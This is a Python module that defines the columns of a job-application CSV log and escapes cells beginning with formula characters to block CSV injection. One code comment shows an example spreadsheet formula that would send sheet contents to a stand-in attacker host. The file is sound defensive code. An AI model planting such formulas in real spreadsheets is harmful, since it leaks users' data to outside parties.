"""Column names and cell encoding for application CSVs."""

APPLIED_COLUMNS = [
    'applied_at',
    'status',
    'source',
    'id',
    'title',
    'company',
    'location',
    'salary',
    'salary_annual_low',
    'salary_annual_high',
    'currency',
    'experience_min',
    'experience_max',
    'posted',
    'url',
    'flags',
    'note',
]


# A spreadsheet runs any cell starting with one of these as a formula, and the
# log is full of text scraped from job boards: a posting titled
# =IMPORTXML("https://attacker.example/?"&A1, ...) would run on import and could
# send the sheet's contents away. From OWASP's CSV Injection page, including the
# full-width forms some locales also treat as formula starts.
FORMULA_START = ('=', '+', '-', '@', '\t', '\r', '\n', '＝', '＋', '－', '＠')
ESCAPE = "'"


def hazardous(value: str) -> bool:
    """Detect formula operators without altering the value to be written."""
    operators = ('=', '+', '-', '@', '＝', '＋', '－', '＠')
    return value.startswith(FORMULA_START) or value.lstrip(' \t\r\n\v\f').startswith(operators)


def sanitize_external(value: str) -> str:
    """Protect external serialized cells without adding a second escape."""
    if value.startswith(ESCAPE):
        return value
    return ESCAPE + value if hazardous(value) else value


def _escaped(value: str) -> bool:
    return hazardous(value.lstrip(ESCAPE))


def neutralise(value):
    """'=1+2' -> "'=1+2": read as text, not run as a formula. Other values pass
    through - including numbers, so a negative figure stays a number. "'=1"
    becomes "''=1", which reads back - and shows in a spreadsheet - as "'=1"."""
    if isinstance(value, str) and _escaped(value):
        return ESCAPE + value
    return value


def restore(value):
    """Undo neutralise(), so the log reads back as the data that went in."""
    if isinstance(value, str) and value.startswith(ESCAPE) and _escaped(value[1:]):
        return value[1:]
    return value
